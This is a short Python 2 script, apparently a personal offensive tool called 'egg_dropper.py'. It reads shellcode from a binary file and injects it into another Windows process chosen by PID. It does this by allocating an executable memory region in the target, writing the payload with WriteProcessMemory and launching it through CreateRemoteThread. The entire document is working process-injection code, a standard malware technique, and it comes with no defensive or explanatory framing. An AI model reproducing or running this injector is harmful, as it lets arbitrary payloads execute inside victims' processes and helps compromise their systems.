"""
egg_dropper.py: A tiny script to harvest shellcode from a bin file, and inject it into a target process.

(c) h4lf-jiffie (dohmatob elvis dopgima)
"""

import sys
from libdebug.debug import *
from ctypes import *
import os

if __name__ == '__main__':
    # sanitize command-line
    if len(sys.argv) < 3:
        print "Usage: python %s [OPTIONS] <target_PID> </path/to/bin/file>"%sys.argv[0]
        sys.exit(1)
        
    # harvest shellcode code from bin file
    shellcode = open(sys.argv[2], 'rb').read()
    pretty = "PAYLOAD (%d bytes):"%len(shellcode)
    for j in xrange(len(shellcode)):
        if (j % 16) == 0:
            pretty += '\n\t\t'
        pretty += r'\x%02X'%ord(shellcode[j])
    print pretty
    
    # grab a handle to the target process
    h = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, 0, int(sys.argv[1]))
    assert h
    
    # dig codecave in target process
    codecave_size = len(shellcode)
    codecave = windll.kernel32.VirtualAllocEx(h, 0, codecave_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    assert codecave
    
    # copy shellcode to remote codecave
    dwBytesWriten = DWORD()
    assert windll.kernel32.WriteProcessMemory(h, codecave, shellcode, len(shellcode), byref(dwBytesWriten))
    assert dwBytesWriten.value == len(shellcode)
    windll.kernel32.FlushInstructionCache(h, codecave, len(shellcode))

    # deploy carrier-thread to trigger remote shellcode
    hThread = windll.kernel32.CreateRemoteThread(h, 0, 0, codecave, 0, 0, 0)
    windll.kernel32.WaitForSingleObject(hThread, INFINITE)
    
    # liberate codecave
    windll.kernel32.VirtualFreeEx(h, codecave, codecave_size, MEM_RELEASE)
    
    
    
        
        